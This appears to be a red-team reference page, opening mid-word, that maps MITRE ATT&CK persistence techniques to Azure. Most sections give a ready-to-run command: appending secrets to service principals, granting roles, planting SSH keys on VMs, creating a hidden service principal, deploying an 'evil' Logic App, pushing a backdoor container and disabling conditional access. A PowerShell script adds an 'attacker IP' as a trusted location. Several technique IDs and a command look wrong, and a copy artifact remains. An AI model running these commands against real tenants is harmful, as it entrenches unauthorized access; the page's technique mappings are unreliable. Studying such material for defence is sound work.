# Persistence: TA0003

hniques to maintain continuous access across reboots, credential rotations, and administrative clean-ups. Persistence is achieved by manipulating cloud identities, implanting malicious workloads, altering authentication processes, or leveraging trusted defaults.

***

#### Account Manipulation **T1098**&#x20;

Account Manipulation refers to adversaries creating, modifying, or disabling accounts to maintain access, escalate privileges, or disrupt operations.\
Rather than relying solely on stolen credentials, attackers alter identity infrastructure to solidify their control — for example, by adding users to privileged groups, resetting passwords, creating new service accounts, or modifying permissions.

These actions allow adversaries to blend in with normal user behavior, evade detection, and establish long-term persistence inside compromised systems or cloud environments.

**Additional Cloud Credentials T1098.001**&#x20;

**Description**:\
Add new authentication credentials (e.g., client secrets, certificates) to Azure Service Principals or Managed Identities to maintain access even after rotation.

**Azure Example**:

```bash
az ad sp credential reset --name <service-principal-id> --append --password <new-password>
```

**Additional Cloud Roles T1098.003**

**Description**:\
Assign new or elevated Azure RBAC roles to existing compromised identities to maintain privileged access.

**Azure Example**:

```bash
az role assignment create --assignee <spn-id> --role Contributor --scope /subscriptions/<sub-id>
```

**SSH Authorized Keys T1098.004**&#x20;

**Description**:\
Plant SSH keys into Azure VMs to maintain persistent remote access.

**Azure Example**:

```bash
az vm extension set --publisher Microsoft.OSTCExtensions --name VMAccessForLinux --vm-name victim-vm --resource-group victim-rg --protected-settings '{"username":"azureuser","ssh_key":"ssh-rsa AAAAB3..."}'
```

#### **Create Account T1136**&#x20;

Create Account refers to adversaries creating new user accounts to establish persistent access to a system.\
By setting up their own accounts — often disguised as legitimate users or service accounts — attackers blend into the environment and maintain control even if other access paths are discovered and shut down.

In containerized and cloud-native infrastructures, this includes:

* Creating new Kubernetes service accounts with specific permissions
* Adding Linux users on container hosts or Kubernetes nodes
* Registering new cloud identities (IAM users, service principals, managed identities) with malicious intent
* Injecting accounts inside images during build or runtime

These accounts allow attackers to authenticate legitimately using trusted mechanisms, bypassing many detection controls.

**Cloud Account T1136.003**&#x20;

**Description**:\
Create hidden Azure Entra ID users, service principals, or guest accounts for ongoing access.

**Azure Example**:

```bash
az ad sp create-for-rbac --name hidden-spn --role Reader --scopes /subscriptions/<sub-id>
```

#### 📅 Event Triggered Execution (**T1546)**

**Description**:\
Use Azure Event Grid, Logic Apps, or Functions to automatically trigger attacker-controlled operations.

**Azure Example**:

```bash
az logic workflow create --resource-group victim-rg --name evil-logicapp --definition @evilworkflow.json
```

***

#### Develop Capabilities T1587

**Description**

Develop Capabilities refers to adversaries creating custom tools, malware, or infrastructure designed specifically to target Azure cloud environments.\
Instead of relying solely on publicly available tools, attackers build specialized capabilities tailored to Azure’s unique systems and defenses.

In Azure environments, this often includes:

* Crafting custom Azure Resource Manager (ARM) scripts for automated exploitation, persistence, or resource deployment
* Building malicious Azure Functions or Logic Apps to trigger unauthorized execution
* Developing tools to harvest Azure Entra ID (Azure AD) credentials, service principal secrets, or access tokens
* Engineering payloads that abuse Azure-specific APIs (e.g., Key Vault access, Storage Account manipulation, Azure SQL attacks)
* Creating malware that impersonates legitimate Azure services (e.g., fake Azure sign-in pages, trojanized Azure CLI binaries)

The goal is to tailor attack tools that blend seamlessly with Azure operations, evade security controls, and maximize impact against cloud-native infrastructure.

#### 🧬 Implant Internal Image T1587.006

**Description**:\
Push backdoored containers into Azure Container Registry or AKS clusters to persist access.

**Azure Example**:

```bash
docker push victimacr.azurecr.io/malicious-backdoor:latest
```

#### Modify Authentication Process&#x20;

Modify Authentication Process refers to adversaries tampering with authentication mechanisms to weaken, bypass, or completely control access controls within a system.\
Instead of stealing credentials directly, attackers alter how authentication happens, making it easier to maintain unauthorized access or disable security policies.

In Azure and containerized environments, this can include:

* Weakening Multi-Factor Authentication (MFA) (e.g., disabling it or forcing re-registration)
* Modifying Identity Federation or Conditional Access Policies to create backdoors or reduce security
* Hijacking or altering authentication tokens used by applications, services, or users
* Replacing or tampering with Identity Providers (IdP) configurations to route authentication through attacker-controlled systems
* Downgrading authentication methods (e.g., forcing fallback to password-only authentication)

By controlling authentication flows, adversaries can persist across reboots, evade security monitoring, and silently escalate privileges.

**Multi-Factor Authentication T1556.006**&#x20;

**Description**:\
Disable, weaken, or bypass MFA enforcement in Azure AD.

**Azure Example**:

```bash
az ad conditional-access policy update --id <policy-id> --state disabled
```

**Hybrid Identity T1556.007**

**Description**:\
Abuse Azure Entra IDConnect to sync rogue accounts across on-premises and cloud.

**Conditional Access Policies T1556.008**

**Description**:\
Alter Azure Conditional Access (CA) policies to create easier access paths.

**Azure Example**:

{% hint style="info" %}
Script utilized to update trusted locations to simulate technique
{% endhint %}

```bash
# Get all named locations
$locations = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"

# Display all locations with their IDs for your reference
$locations.value | ForEach-Object {
    Write-Host "Location: $($_.displayName), ID: $($_.id)"
}

# Ask for input to select which location to update
$locationId = Read-Host "Copy and paste the ID of the location you want to update"

# Only proceed if an ID was provided
if ($locationId) {
    # Create update parameters
    $params = @{
        "@odata.type" = "#microsoft.graph.ipNamedLocation"
        displayName = "Updated Trusted Location"
        ipRanges = @(
            @{
                "@odata.type" = "#microsoft.graph.iPv4CidrRange"
                cidrAddress = "192.168.1.0/24"
            },
            @{
                "@odata.type" = "#microsoft.graph.iPv4CidrRange"
                cidrAddress = "10.0.0.0/24"
            },
            @{
                "@odata.type" = "#microsoft.graph.iPv4CidrRange"
                cidrAddress = "1.3.3.7/32"  # Attacker IP
            }
        )
        isTrusted = $true
    }
    
    # Update using the API directly to avoid property name confusion
    $updateUri = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations/$locationId"
    $response = Invoke-MgGraphRequest -Method PATCH -Uri $updateUri -Body ($params | ConvertTo-Json -Depth 10)
    
    Write-Host "Location updated successfully!"
} else {
    Write-Host "No ID provided. Update canceled."
}
```

***

#### 👥 Valid Accounts → **T1078 – Valid Accounts**

***

**➡️ T1078.004 – Default Accounts**

**Description**:\
Use Azure default service principals or unmanaged accounts left behind.

**Azure Example**:

✅ **Mapping**:\
**MITRE ID**: T1078.004 – _Valid Accounts: Default Accounts_

***

**➡️ T1078.004 – Cloud Accounts**

**Description**:\
Use valid stolen Azure AD user or service principal accounts for persistence.

**Azure Example**:

```bash
bashCopyEditaz login --username stolenuser@victimdomain.com
```

✅ **Mapping**:\
**MITRE ID**: T1078.004 – _Valid Accounts: Cloud Accounts_\
(_same subtechnique number, Cloud Accounts roll under Default/Cloud Service Accounts in T1078.004_)

***

## 📊 Final Mapping Table (Persistence Techniques in Azure)

| Technique/Subtechnique             | MITRE ID  | Azure Example                          |
| ---------------------------------- | --------- | -------------------------------------- |
| Additional Cloud Credentials       | T1098.001 | Add client secret to Service Principal |
| Additional Cloud Roles             | T1098.003 | Grant Contributor to SPN               |
| SSH Authorized Keys                | T1098.004 | Add SSH key via VM extension           |
| Create Cloud Account               | T1136.003 | Create hidden SPN                      |
| Event Triggered Execution          | T1546     | Deploy malicious Logic App             |
| Implant Internal Image             | T1587.006 | Push malicious container to ACR        |
| Modify MFA                         | T1556.006 | Disable CA policy enforcing MFA        |
| Modify Hybrid Identity             | T1556.007 | Abuse Azure AD Connect                 |
| Modify Conditional Access Policies | T1556.008 | Add trusted location to CA policy      |
| Default Accounts                   | T1078.004 | Use leftover SPN or managed identity   |
| Cloud Accounts                     | T1078.004 | Use stolen Azure AD user credentials   |
